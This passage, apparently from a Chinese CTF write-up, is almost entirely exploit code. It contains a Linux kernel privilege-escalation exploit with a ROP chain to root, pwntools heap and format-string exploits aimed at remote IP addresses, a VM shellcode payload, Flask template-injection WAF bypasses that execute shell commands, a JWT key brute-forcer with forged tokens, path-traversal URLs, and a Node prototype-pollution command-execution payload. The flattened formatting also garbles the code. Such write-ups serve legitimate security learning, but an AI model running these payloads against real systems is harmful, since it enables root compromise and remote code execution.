 ur.range.start = (unsigned long)fault_page; // 我们要监视的区域 ur.range.len = 0x1000; ur.mode = UFFDIO_REGISTER_MODE_MISSING;if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) // 注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作 die("[-] ioctl-UFFDIO_REGISTER");// 开一个线程，接收错误的信号，然后处理int s = pthread_create(&thr, NULL, handler, (void *)uffd);if (s != 0) die("[-] pthread_create");}
static void *fault_handler_thread(void *arg){struct uffd_msg msg;
unsigned long uffd = (unsigned long)arg; logi("fault_handler_thread created");
int nready;
struct pollfd pollfd; pollfd.fd = uffd; pollfd.events = POLLIN; nready = poll(&pollfd, 1, -1);
if (nready != 1) { die("Wrong poll return val"); } nready = read(uffd, &msg, sizeof(msg));if (nready <= 0) { die("msg err"); }
// kfreememset(tmp_buf, 0x1, sizeof(tmp_buf)); *(size_t *)(tmp_buf + 0x28) = 0; ioctl(fd, 0xFFF1, tmp_buf);
memset(msg_buf, 0, sizeof(msg_buf));
int ret = write_msg(msg_qid, msg_buf, 0x400 - 0x30, 0x1337);if (ret < 0) { die("msgwrite"); }
char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);if (page == MAP_FAILED) { die("[-] mmap err"); }struct uffdio_copy uc;
// init pagememset(page, 0, sizeof(page)); *(size_t *)page = 0x1000; *(size_t *)(page + 0x8) = ptr + 0x300; *(size_t *)(page + 0x10) = 0;
 uc.src = (unsigned long)page; uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1); uc.len = 0x1000; uc.mode = 0; uc.copy = 0; ioctl(uffd, UFFDIO_COPY, &uc); logi("sleep3 handler1 done"); flag = 1;
return NULL;}
struct pipe_buffer{uint64_t page;
uint32_t offset, len;
uint64_t ops;
uint32_t flags;
uint32_t padding;
uint64_t private;};
struct pipe_buf_operations{uint64_t confirm;
uint64_t release;
uint64_t try_steal;
uint64_t get;};
void main(int argc, char **argv, char **env){ saveUserState(); bind_core(0);
char *uffd_buf_pwn;
 uffd_buf_pwn = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); RegisterUserfault(uffd_buf_pwn + 0x1000, fault_handler_thread);
 msg_qid = get_msg_queue();
 fd = open("/dev/ksctf", O_RDWR);if (fd < 0) { die("open /dev/ksctf error"); }
// kmallocmemset(tmp_buf, 0x1, sizeof(tmp_buf)); *(size_t *)(tmp_buf + 0x28) = buf; ioctl(fd, 0xFFF0, tmp_buf); ptr = *(size_t *)buf; logi("get ptr:%llx", *(size_t *)buf);
if (pipe(pipe_fd) < 0) die("failed to create pipe!");
// write something to activate itif (write(pipe_fd[1], "stas", 8) < 0) die("failed to write the pipe!");
 *(size_t *)(uffd_buf_pwn + 0xfe8) = 0; write(fd, uffd_buf_pwn + 0xfe8, 0x28);
do {/* code */ } while (flag == 0);memset(leak_buf, 0x0, sizeof(leak_buf));if (read_msg(msg_qid, leak_buf, 0x1000, 0x1337) < 0) { die("msgread"); }
 kernel_base = *(size_t *)(leak_buf + 0x400 - 0x30 + 0x18) - 0x101a740; logi("kernel_base:%llx", kernel_base); prepare_kernel_cred = kernel_base + 0x98140; commit_creds = kernel_base + 0x97d00; swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xc00a74;
memset(msg_buf, 0, sizeof(msg_buf));
size_t *rop_chain;
int idx = 0; rop_chain = (size_t *)&msg_buf[0x118]; rop_chain[idx++] = kernel_base + 0x448278; rop_chain[idx++] = kernel_base + 0x448278; // pop_rdi_ret rop_chain[idx++] = 0; rop_chain[idx++] = prepare_kernel_cred; rop_chain[idx++] = kernel_base + 0x25c18; rop_chain[idx++] = 0; // mov_rdi_rax;pop_rbx rop_chain[idx++] = commit_creds; // commit_creds rop_chain[idx++] = kernel_base + 0x448278 + 1; rop_chain[idx++] = swapgs_restore_regs_and_return_to_usermode + 49; rop_chain[idx++] = 0x0; rop_chain[idx++] = 0x0; rop_chain[idx++] = get_root_shell; rop_chain[idx++] = user_cs; rop_chain[idx++] = user_rflags; rop_chain[idx++] = user_sp; rop_chain[idx++] = user_ss;
 *(size_t *)(msg_buf + 0x100) = kernel_base + 0xab262a; // add rsp, 0x10; pop rbp; ret; *(size_t *)(msg_buf + 0x110) = ptr + 0x400 + 0x98 + 8; *(size_t *)(msg_buf + 0x198 + 0x10) = kernel_base + 0x599a34; // push rsi; pop rsp setxattr("/tmp/exp", "stas", msg_buf, 0x400, 0);
 close(pipe_fd[0]); close(pipe_fd[1]);}
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *import jsoncontext(arch='amd64', os='linux', log_level='debug')
# use script modecli_script()
# get use for obj from giftio: tube = gift['io']elf: ELF = gift['elf']libc: ELF = gift['libc']

def add(username,lent,cont): json_str = '[{"task_type":0,"username":"{}","size":{},"content":"{}"}]' data = json.loads(json_str) data[0]["username"] = base64.b64encode(username).decode() data[0]["size"] = lent data[0]["content"] = base64.b64encode(cont).decode() new_json_str = json.dumps(data) sla(b'Please input your tasks', new_json_str)
def show(username): json_str = '[{"task_type":1,"username":"{}","size":32,"content":"YWRtaW4="}]' data = json.loads(json_str) data[0]["username"] = base64.b64encode(username).decode() new_json_str = json.dumps(data) sla(b'Please input your tasks', new_json_str)
def free(username): json_str = '[{"task_type":2,"username":"{}","size":32,"content":"YGNhdCBmbGFnYA=="}]' data = json.loads(json_str) data[0]["username"] = base64.b64encode(username).decode() new_json_str = json.dumps(data) sla(b'Please input your tasks', new_json_str)
def gift(username): json_str = '[{"task_type":-1,"username":"{}","size":32,"content":"YGNhdCBmbGFnYA=="}]' data = json.loads(json_str) data[0]["username"] = base64.b64encode(username).decode() new_json_str = json.dumps(data) sla(b'Please input your tasks', new_json_str)

add(b'aa',0x60,b'a'*0x70)add(b'bb',0x60,b'b'*0x70)add(b'cc',0x60,b'c'*0x68+p64_ex(0x71))
add(b'dd',0x60,b'd'*0x70)add(b'ee',0x60,b'e'*0x70)add(b'ff',0x60,b'f'*0x70)
add(b'gg',0x60,b'g'*0x70)add(b'hh',0x60,b'h'*0x70)add(b'ii',0x60,b'i'*0x70)
sla(b'Please input your tasks', b'11')show(b'hh')ru(b'user content:nn')heap_base=u64_ex(r(8))-0x680log_address_ex2(heap_base)
free(b'bb')add(b'jj',0x60,p64_ex(heap_base)+b'a'*0x68)add(b'kk',0x60,p64_ex(heap_base)+b'a'*0x68)add(b'll',0x60,p64_ex(0)+p64_ex(0x5e1)+b'x00'*0x60)
free(b'cc')add(b'gg',0x60,b'g'*8)show(b'gg')
set_current_libc_base_and_log(recv_current_libc_addr(),0x1ecbe0)
gift(hex(libc.symbols['puts']).encode()+b'x00')

ia()
from pwn import *from LibcSearcher import *#io = process('./factory')elf = ELF('./factory')context(log_level='debug',arch=elf.arch,os=elf.os)io = remote('1.95.81.93',57777)libc = ELF('./libc.so.6')def debug(): gdb.attach(io) pause()def get_sys():
return libcbase + next(libc.search(b'/bin/shx00')), libcbase + libc.sym['system']r = lambda num : io.recv(num)ru = lambda data : io.recvuntil(data)rl = lambda : io.recvline()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sla = lambda data,pay : io.sendlineafter(data,pay)uu64 = lambda size : u64(io.recv(size).ljust(8,b'x00'))uu32 = lambda size : u32(io.recv(size).ljust(4,b'x00'))itr = lambda : io.interactive()li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')def fac(data): ru(b'= ') s(str(data))ru(b'How many factorys do you want to build: ')sl(str(40))for i in range(24): fac(i)ru(b'= ')#debug()s(str(elf.got['atol']-200))li(hex(elf.got['atol']))ru(b'= ')#debug()s(str(elf.plt['printf']))ru(b'= ')s("%14$p,%47$p")ru(b'0x')stack=int(r(12),16)+0x18li(hex(stack))ru(b'0x')libcbase=int(r(12),16)-147587li(hex(libcbase))one=libcbase+0xe3b01li(hex(one))ru(b'= ')pay = b'%' + str(one&0xffff).encode()+b'c%10$hn'pay=pay.ljust(0x10,b'x00')+p64(stack)#debug()s(pay)ru(b'= ')pay = b'%' + str(one>>16&0xffff).encode()+b'c%10$hn'pay=pay.ljust(0x10,b'x00')+p64(stack+2)s(pay)ru(b'= ')pay = b'%39c%10$hn'pay=pay.ljust(0x10,b'x00')+p64(stack-72)#debug()s(pay)itr()
./ugollvm-as hello.ll -o hello.bcllc hello.bc -o hello.sas -o hello.o hello.sgcc -no-pie -static hello.o -o hello
package main
func binsh() string{return "/bin/shx00"}func vuln() string{return "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}func main() {var num string = vuln() num="x10x80x49x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x27x7bx44x00x00x00x00x00x3bx00x00x00x00x00x00x00xc4x1bx40x00x00x00x00x00x77x77x77x77x77x77x77x77x88x88x88x88x88x88x88x88x11x11x11x11x11x11x11x22x22x22x22x22x22x22x22x33x33x33x33x33x33x33x33"return 0}
from tools import *context.log_level="debug"context.arch = "amd64"p,elf,libc=load("./vmcode","1.95.68.23:
58924")'''mb_push_addr_from_code x32stack[a1] = &stack[a1 - 1] x31magic_syscall x30-0x10 = rol_8_0x10 x2e-0x10 = and_8_0x10 x2f ror_8_0x10-rdix2dchange_pc x2cstack-8 = shl_8 x2bmov [stack-8],[stack-0x10] x2ashr_8_8 x29dec_rdi x28mov_rax_al_from_stack x27mov_4_imm_int_to_stack_int64_from_code x26exchange_stack_8_0x10 x25exchange_stack_8_stack_0x18 x24
xor_stack_0x10_stack_8 x23mov_esi_stack_rdi x22exchange_pc_code2bytes_to_stack8bytes x21 '''debug(p,"pie",0x12b8,0x0000000000001273)payload =b"x26"+b"x00"*4+b"x2fx28x26x66x6cx61x67"payload+=b"x31"+b"x26x00x00x00x00"+b"x25"payload+=b"x26x02x00x00x00"#x01x01x00x00x58x68x66x6Cx61x67x54x5Ex0Fx05x50x5Ex6Ax01x5Fx48x31xD2x68x00x01x00x00x59x6Ax28x58x0Fx05"payload+=b"x30"payload += b"x26x00x03x00x00"+b"x32"+b"x26x00x03x00x00"+b"x23"payload +=b"x26x03x00x00x00"+b"x26x00x00x00x00"+b"x30"payload += b"x32"+b"x26xb2x03x00x00"+b"x23"payload+=b"x26x00x05x00x00"+b"x31"+b"x24"+b"x26x01x00x00x00"+b"x26x01x00x00x00"+b"x30"#payload+=b"x28"*17+b"x26x00x03x00x00"+b"x24"*3+b"x26x03x00x00x00"payload=payload.ljust(0x50,b"x91")
sa("shellcode:",payload)p.interactive()
from flask import Flask, render_template, request, render_template_string,redirect
from verify import *from User import Userimport base64
from waf import waf
app = Flask(__name__,static_folder="static",template_folder="templates")user={}
@app.route('/register', methods=["POST","GET"])def register(): method=request.methodif method=="GET":
return render_template("register.html")if method=="POST":
data = request.get_json() name = data["username"] pwd = data["password"]if name != None and pwd != None:if data["username"] in user:
return "This name had been registered"else: user[name] = User(name, pwd)return "OK"
@app.route('/login', methods=["POST","GET"])def login(): method=request.methodif method=="GET":
return render_template("login.html")if method=="POST":
data = request.get_json() name = data["username"] pwd = data["password"]if name != None and pwd != None:if name not in user:
return "This account is not exist"else:if user[name].pwd == pwd: token=generateToken(user[name])return "OK",200,{"Set-Cookie":"Token="+token}else:
return "Wrong password"
@app.route('/admin', methods=["POST","GET"])def admin():
try: token = request.headers.get("Cookie")[6:] 
except:
return "Please login first"else: infor = json.loads(base64.b64decode(token)) name = infor["name"] token = infor["secret"] result = check(user[name], token)
 method=request.methodif method=="GET":
return render_template("admin.html",name=name)if method=="POST": template = request.form.get("code")if result != "True":
return result, 401 #just only blackListif waf(template):
return "Hacker Found" result=render_template_string(template) print(result)if result !=None:
return "OK"else:
return "error"
@app.route('/', methods=["GET"])def index():
return redirect("login")
@app.route('/removeUser', methods=["POST"])def remove():
try: token = request.headers.get("Cookie")[6:] 
except:
return "Please login first"else: infor = json.loads(base64.b64decode(token)) name = infor["name"] token = infor["secret"] result = check(user[name], token)if result != "True":
return result, 401
 rmuser=request.form.get("username") user.pop(rmuser)return "Successfully Removed:"+rmuser
if __name__ == '__main__': # for the safe del __builtins__.__dict__['eval'] app.run(debug=False, host='0.0.0.0', port=8080)
import time
class User():
def __init__(self,name,password):
self.name=nameself.pwd = passwordself.Registertime=str(time.time())[0:10]self.handle=None
self.secret=self.setSecret()
def handler(self):
self.handle = open("/dev/random", "rb")def setSecret(self): secret = self.Registertime
try:if self.handle == None:
self.handler() secret += str(self.handle.read(22).hex()) 
except Exception as e: print("this file is not exist or be removed")return secret
import jsonimport hashlibimport base64import jwt
from app import *from User import *def check(user,crypt): verify_c=crypt secret_key = user.secret
try: decrypt_infor = jwt.decode(verify_c, secret_key, algorithms=['HS256'])if decrypt_infor["is_admin"]=="1":
return "True"else:
return "You r not admin"
except:
return 'Don't be a Hacker!!!'
def generateToken(user): secret_key=user.secret secret={"name":
user.name,"is_admin":"0"}
 verify_c=jwt.encode(secret, secret_key, algorithm='HS256') infor={"name":
user.name,"secret":
verify_c} token=base64.b64encode(json.dumps(infor).encode()).decode()return token
evilcode=["\","{%","config","session","request","self","url_for","current_app","get_flashed_messages","lipsum","cycler","joiner","namespace","chr","request.","|","%c","eval","[","]","exec","pop(","get(","setdefault","getattr",":","os","app"]whiteList=[]def waf(s): s=str(s.encode())[2:-1].replace("\'","'").replace(" ","")if not s.isascii():
return Falseelse:
for key in evilcode:if key in s:
return Truereturn False
import time
class User():
def __init__(self,name,password):
self.name=nameself.pwd = passwordself.Registertime=str(time.time())[0:10]self.handle=None
self.secret=self.setSecret()
def handler(self):
self.handle = open("/dev/random", "rb")def setSecret(self): secret = self.Registertime
try:if self.handle == None:
self.handler() secret += str(self.handle.read(22).hex()) 
except Exception as e: print("this file is not exist or be removed")return secret
eyJuYW1lIjogImFkbWluIiwgInNlY3JldCI6ICJleUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKdVlXMWxJam9pWVdSdGFXNGlMQ0pwYzE5aFpHMXBiaUk2SWpBaWZRLlhLZmpXU1VkM2JYNEdXUjFCU1EwWUp0V0h5MVhwTzdnbEFNamlxdk1ucUUifQ==
{"name": "admin", "secret": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJpc19hZG1pbiI6IjAifQ.XKfjWSUd3bX4GWR1BSQ0YJtWHy1XpO7glAMjiqvMnqE"}
import time
from datetime import datetime, timezone
# 打印 Unix 时间戳的前10位print(str(time.time())[0:10])
# 将时间戳转换为 UTC 时间以验证
# utc_time = datetime.now(timezone.utc)
# print("当前 UTC 时间:", utc_time)
eyJuYW1lIjogIkpheTE3IiwgInNlY3JldCI6ICJleUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKdVlXMWxJam9pU21GNU1UY2lMQ0pwYzE5aFpHMXBiaUk2SWpBaWZRLjMtOWVoMWl1WkszM2libEN4V0lZR0FwZmNHUkVVWHBxaHQ4RkdLZ0c1N1UifQ==
{"name": "Jay17", "secret": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmF5MTciLCJpc19hZG1pbiI6IjAifQ.3-9eh1iuZK33iblCxWIYGApfcGREUXpqht8FGKgG57U"}
import jwt
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmF5MTciLCJpc19hZG1pbiI6IjAifQ.3-9eh1iuZK33iblCxWIYGApfcGREUXpqht8FGKgG57U" # 题目中的 token#password_file = "C:\Users\86159\PycharmProjects\pythonProject\WEB-xxx\JWT\jwtpassword.txt" # 密码字典文件password_file = "./jwtpassword.txt" # 枚举密码字典文件
with open(password_file,'rb') as file:
for line in file: line = line.strip() # 去除每行后面的换行
try: jwt.decode(token, verify=True, key=line, algorithms="HS256") # 设置编码方式为 HS256 print('key: ', line.decode('ascii'))break
except (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError , jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError): # 出现这些错误，虽然表示过期之类的错误，但是密钥是正确的 print("key: ", line.decode('ascii'))break
except jwt.exceptions.InvalidSignatureError: # 签名错误则表示密钥不正确 print("Failed: ", line.decode('ascii'))continueelse: print("Not Found.")
eyJuYW1lIjogIkpheTE3IiwgInNlY3JldCI6ICJleUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKdVlXMWxJam9pU21GNU1UY2lMQ0pwYzE5aFpHMXBiaUk2SWpFaWZRLjBuVkp5NmpEaC0yRVRFWUtZWmcxNmFMTWxURTBDbFdzTWtxUzdfRmVEbjAifQ==
from flask import Flask, render_template, request, render_template_string,redirect

app = Flask(__name__,static_folder="static",template_folder="templates")

evilcode=["\","{%","config","session","request","self","url_for","current_app","get_flashed_messages","lipsum","cycler","joiner","namespace","chr","request.","|","%c","eval","[","]","exec","pop(","get(","setdefault","getattr",":","os","app"]whiteList=[]def waf(s): s=str(s.encode())[2:-1].replace("\'","'").replace(" ","")if not s.isascii():
return Falseelse:
for key in evilcode:if key in s:
return Truereturn False
@app.route('/', methods=["POST"])def index(): template = request.form.get("code")if waf(template):
return "Hacker Found"
 result=render_template_string(template)return result

if __name__ == '__main__':# for the safedel __builtins__.__dict__['eval'] app.run(debug=False, host='0.0.0.0', port=8080)
if __name__ == '__main__':# for the safedel __builtins__.__dict__['eval'] app.run(debug=False, host='0.0.0.0', port=8080)
{{x.__init__.__globals__.__builtins__.__import__('OS'.lower()).popen('echo f3n j1ng;').read()}}
code={{g.pop.__globals__.__builtins__.__getitem__('EXEC'.lower())("print('123')")}}code={{g.pop.__globals__.__builtins__.__getitem__('ex''ec')("print('123')")}}
code={{g.pop.__globals__.__builtins__.__getitem__('EXEC'.lower())("print('123')")}}
payload = "__import__("sys").modules.__getitem__("__main__").__dict__.__getitem__("APP".lower()).before_request_funcs.setdefault(None, []).append(lambda :
__import__('os').popen('/readflag').read())"encoded_payload = payload.encode('utf-8').hex()final_payload = f"bytes.fromhex('{encoded_payload}').decode('utf-8')"print(final_payload)
code={{g.pop.__globals__.__builtins__.__getitem__('EXEC'.lower())("__import__('builtins').__dict__.__getitem__('EXEC'.lower())(bytes.fromhex('5f5f696d706f72745f5f282273797322292e6d6f64756c65732e5f5f6765746974656d5f5f28225f5f6d61696e5f5f22292e5f5f646963745f5f2e5f5f6765746974656d5f5f2822415050222e6c6f7765722829292e6265666f72655f726571756573745f66756e63732e73657464656661756c74284e6f6e652c205b5d292e617070656e64286c616d626461203a5f5f696d706f72745f5f28276f7327292e706f70656e28272f72656164666c616727292e72656164282929').decode('utf-8'))")}}
wafsql = function(str){console.log(str)return str}
admin'or 1=1
#
http://1.95.83.156:
30688/ExP0rtApi?v=static&f=//....//....//....//....//....//....//....//app/index.jshttp://1.95.83.156:
30688/ExP0rtApi?v=static&f=//....//....//....//....//....//....//....//app/handle/index.jshttp://1.95.83.156:
30688/ExP0rtApi?v=static&f=//....//....//....//....//....//....//....//app/handle/child_process.js
{"user":"__proto__","date":"2","reportmessage":{"env":{"NODE_OPTIONS":"-r /proc/self/environ","NODE_DEBUG":"require('child_process').execSync('touch /tmp/kaikaix');process.exit();//"},"shell":"/readflag"}}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]